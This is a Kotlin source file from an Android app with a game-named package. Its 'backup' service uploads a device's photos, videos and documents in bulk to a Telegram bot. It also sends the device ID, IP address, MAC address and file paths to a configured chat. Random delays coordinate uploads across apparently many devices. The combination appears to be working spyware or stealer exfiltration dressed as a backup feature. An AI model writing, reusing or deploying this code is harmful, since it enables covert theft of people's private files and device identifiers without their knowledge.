package com.service.assasinscreed02.backup.data.services

import android.content.Context
import android.os.Build
import android.util.Log
import com.service.assasinscreed02.DeviceInfo
import com.service.assasinscreed02.backup.domain.entities.BackupConfig
import com.service.assasinscreed02.backup.domain.entities.BackupResult
import com.service.assasinscreed02.backup.domain.repositories.BackupRepository
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlinx.coroutines.delay
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * Servicio para subir archivos a Telegram
 */
class TelegramUploadService(
    private val backupRepository: BackupRepository
) {
    
    companion object {
        private const val TAG = "TelegramUploadService"
    }
    
    /**
     * Resultado de una subida de archivos
     */
    data class UploadResult(
        val filesSent: Int,
        val filesError: Int
    )
    
    /**
     * Sube archivos en lotes
     */
    suspend fun uploadFilesInBatches(
        config: BackupConfig,
        files: List<File>,
        batchSize: Int,
        batchType: String,
        context: Context,
        progressCallback: (BackupResult.Progress) -> Unit
    ): UploadResult = withContext(Dispatchers.IO) {
        var filesSent = 0
        var filesError = 0
        
        if (files.isEmpty()) {
            return@withContext UploadResult(filesSent, filesError)
        }
        
        val batches = files.chunked(batchSize)
        Log.d(TAG, "Enviando ${files.size} archivos en ${batches.size} lotes de $batchSize")
        
        for ((batchIndex, batch) in batches.withIndex()) {
            Log.d(TAG, "Procesando lote ${batchIndex + 1}/${batches.size} de $batchType")
            
            for ((fileIndex, file) in batch.withIndex()) {
                val currentFileIndex = batchIndex * batchSize + fileIndex
                
                progressCallback(
                    BackupResult.Progress(
                        currentFile = file.name,
                        phase = "Enviando $batchType",
                        progress = currentFileIndex,
                        total = files.size,
                        sent = filesSent,
                        errors = filesError,
                        fileProgress = fileIndex,
                        fileSize = file.length()
                    )
                )
                
                val result = sendFileToTelegram(config, file, context)
                if (result) {
                    filesSent++
                    backupRepository.saveUploadedFile(context, backupRepository.calculateFileHash(file))
                } else {
                    filesError++
                }
                
                // Delay entre archivos para evitar rate limiting
                delay(1000)
            }
            
            // Delay entre lotes
            if (batchIndex < batches.size - 1) {
                delay(config.batchDelayMs)
            }
        }
        
        UploadResult(filesSent, filesError)
    }
    
    /**
     * Envía un archivo a Telegram
     */
    private suspend fun sendFileToTelegram(config: BackupConfig, file: File, context: Context? = null): Boolean = withContext(Dispatchers.IO) {
        try {
            // Validaciones iniciales
            if (!file.exists()) {
                Log.w(TAG, "Archivo no existe: ${file.name}")
                return@withContext false
            }
            
            if (!file.canRead()) {
                Log.w(TAG, "Archivo no se puede leer: ${file.name}")
                return@withContext false
            }
            
            if (file.length() == 0L) {
                Log.w(TAG, "Archivo vacío: ${file.name}")
                return@withContext false
            }
            
            // Verificar tamaño del archivo (límite de Telegram: 50MB)
            val maxSize = 50L * 1024 * 1024
            if (file.length() > maxSize) {
                Log.w(TAG, "Archivo demasiado grande (${file.length() / 1024L / 1024L}MB): ${file.name}")
                return@withContext false
            }
            
            // Delay aleatorio para evitar conflictos entre dispositivos
            val randomDelay = (1000..5000).random()
            delay(randomDelay.toLong())
            Log.d(TAG, "⏳ Delay aleatorio aplicado: ${randomDelay}ms para evitar conflictos")
            
            val url = "https://api.telegram.org/bot${config.token}/sendDocument"
            val maxReintentos = 5
            var intento = 1
            var backoff = 1000L
            val maxBackoff = 60000L
            
            while (intento <= maxReintentos) {
                try {
                    val client = OkHttpClient.Builder()
                        .connectTimeout(60L, java.util.concurrent.TimeUnit.SECONDS)
                        .readTimeout(300L, java.util.concurrent.TimeUnit.SECONDS)
                        .writeTimeout(300L, java.util.concurrent.TimeUnit.SECONDS)
                        .build()
                    
                    val mimeType = getMimeType(file)
                    val caption = createCaption(file, context)
                    
                    val requestBodyBuilder = okhttp3.MultipartBody.Builder()
                        .setType(okhttp3.MultipartBody.FORM)
                        .addFormDataPart("chat_id", config.chatId)
                        .addFormDataPart("document", file.name, file.asRequestBody(mimeType.toMediaTypeOrNull()))
                        .addFormDataPart("caption", caption)
                        .addFormDataPart("parse_mode", "HTML")
                    
                    val requestBody = requestBodyBuilder.build()
                    val request = Request.Builder().url(url).post(requestBody).build()
                    
                    val response = client.newCall(request).execute()
                    val responseBody = response.body?.string() ?: ""
                    
                    if (!response.isSuccessful) {
                        // Manejo mejorado de error 429 (rate limit)
                        if (response.code == 429) {
                            var retryAfter = 0L
                            try {
                                val json = JSONObject(responseBody)
                                retryAfter = json.optJSONObject("parameters")?.optLong("retry_after") ?: 0L
                            } catch (_: Exception) {}
                            
                            val additionalDelay = (5000..15000).random()
                            val totalDelay = if (retryAfter > 0) retryAfter * 1000 + additionalDelay else backoff + additionalDelay
                            
                            Log.w(TAG, "Error 429: esperando ${totalDelay}ms antes de reintentar archivo ${file.name}")
                            delay(totalDelay)
                            
                            if (retryAfter == 0L) {
                                backoff = (backoff * 2).coerceAtMost(maxBackoff)
                            }
                            intento++
                            response.close()
                            continue
                        }
                        
                        val msg = "Error HTTP ${response.code}: $responseBody"
                        Log.e(TAG, "Error HTTP enviando archivo ${file.name} a Telegram: $msg")
                        response.close()
                        return@withContext false
                    }
                    
                    if (responseBody.isEmpty()) {
                        Log.w(TAG, "Respuesta vacía del servidor para: ${file.name}")
                        response.close()
                        return@withContext false
                    }
                    
                    if (!responseBody.contains("\"ok\":true")) {
                        Log.e(TAG, "Error en respuesta de Telegram para ${file.name}: $responseBody")
                        response.close()
                        return@withContext false
                    }
                    
                    Log.d(TAG, "✅ Archivo enviado exitosamente: ${file.name}")
                    response.close()
                    return@withContext true
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Error enviando archivo ${file.name} (intento $intento): ${e.message}")
                    delay(backoff)
                    backoff = (backoff * 2).coerceAtMost(maxBackoff)
                    intento++
                }
            }
            
            Log.e(TAG, "No se pudo enviar el archivo tras $maxReintentos intentos: ${file.name}")
            false
            
        } catch (e: Exception) {
            Log.e(TAG, "Error inesperado enviando archivo ${file.name}: ${e.message}")
            false
        }
    }
    
    /**
     * Obtiene el tipo MIME de un archivo
     */
    private fun getMimeType(file: File): String {
        return when (file.extension.lowercase()) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "mp4" -> "video/mp4"
            "mov" -> "video/quicktime"
            "avi" -> "video/x-msvideo"
            "pdf" -> "application/pdf"
            "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            "txt" -> "text/plain"
            else -> "application/octet-stream"
        }
    }
    
    /**
     * Crea el caption para el archivo
     */
    private fun createCaption(file: File, context: Context?): String {
        return buildString {
            append("📄 <b>Archivo:</b> ${file.name}\n")
            append("💾 <b>Tamaño:</b> ${formatFileSize(file.length())}\n")
            append("📅 <b>Fecha:</b> ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date(file.lastModified()))}\n")
            append("📱 <b>Dispositivo:</b> ${Build.MANUFACTURER} ${Build.MODEL}\n")
            append("📍 <b>Origen:</b> ${file.absolutePath}")
        }
    }
    
    /**
     * Formatea el tamaño de archivo
     */
    private fun formatFileSize(size: Long): String {
        return when {
            size < 1024 -> "$size B"
            size < 1024 * 1024 -> "${size / 1024} KB"
            size < 1024 * 1024 * 1024 -> "${size / (1024 * 1024)} MB"
            else -> "${size / (1024 * 1024 * 1024)} GB"
        }
    }
    
    /**
     * Notifica el inicio de un backup
     */
    suspend fun notifyBackupStart(config: BackupConfig, context: Context) = withContext(Dispatchers.IO) {
        try {
            val deviceInfo = DeviceInfo(context)
            val deviceId = deviceInfo.getDeviceId()
            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
            val ipAddress = deviceInfo.getIpAddress() ?: "No disponible"
            val macAddress = deviceInfo.getMacAddress() ?: "No disponible"
            
            val mensaje = """
                🚀 *Iniciando Backup*
                
                📱 *Dispositivo:*
                • Nombre: $deviceName
                • ID: `$deviceId`
                • IP: $ipAddress
                • MAC: $macAddress
                
                ⏰ *Inicio:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
                
                🔄 *Estado:* Preparando archivos para subida...
                
                _Este dispositivo comenzará a subir archivos en breve._
            """.trimIndent()
            
            sendTelegramMessage(config, mensaje)
            Log.d(TAG, "✅ Notificación de inicio enviada para dispositivo: $deviceName")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error enviando notificación de inicio: ${e.message}")
        }
    }
    
    /**
     * Notifica la finalización de un backup
     */
    suspend fun notifyBackupCompletion(config: BackupConfig, context: Context, success: Boolean) = withContext(Dispatchers.IO) {
        try {
            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
            
            val mensaje = if (success) {
                """
                ✅ *Backup Completado*
                
                📱 *Dispositivo:* $deviceName
                ⏰ *Finalización:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
                
                🎉 *Estado:* Backup finalizado exitosamente
                
                _El dispositivo ha terminado de subir todos los archivos._
                """.trimIndent()
            } else {
                """
                ⚠️ *Backup Sin Archivos*
                
                📱 *Dispositivo:* $deviceName
                ⏰ *Finalización:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
                
                ℹ️ *Estado:* No se encontraron archivos nuevos para subir
                
                _El backup se completó sin encontrar archivos nuevos._
                """.trimIndent()
            }
            
            sendTelegramMessage(config, mensaje)
            Log.d(TAG, "✅ Notificación de finalización enviada para dispositivo: $deviceName")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error enviando notificación de finalización: ${e.message}")
        }
    }
    
    /**
     * Notifica un error durante el backup
     */
    suspend fun notifyBackupError(config: BackupConfig, context: Context, errorMessage: String) = withContext(Dispatchers.IO) {
        try {
            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
            
            val mensaje = """
                ❌ *Error en Backup*
                
                📱 *Dispositivo:* $deviceName
                ⏰ *Error:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
                
                🚨 *Problema:* $errorMessage
                
                🔧 *Acción:* Revisar logs del dispositivo
                
                _El backup se interrumpió debido a un error._
            """.trimIndent()
            
            sendTelegramMessage(config, mensaje)
            Log.d(TAG, "⚠️ Notificación de error enviada para dispositivo: $deviceName")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error enviando notificación de error: ${e.message}")
        }
    }
    
    /**
     * Envía un mensaje simple a Telegram
     */
    private suspend fun sendTelegramMessage(config: BackupConfig, mensaje: String) = withContext(Dispatchers.IO) {
        try {
            val url = "https://api.telegram.org/bot${config.token}/sendMessage"
            val client = OkHttpClient.Builder()
                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
                .build()
            
            val json = JSONObject().apply {
                put("chat_id", config.chatId)
                put("text", mensaje)
                put("parse_mode", "Markdown")
            }
            
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(body).build()
            
            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                Log.w(TAG, "Error enviando mensaje: ${response.code}")
            }
            response.close()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error enviando mensaje a Telegram: ${e.message}")
        }
    }
} 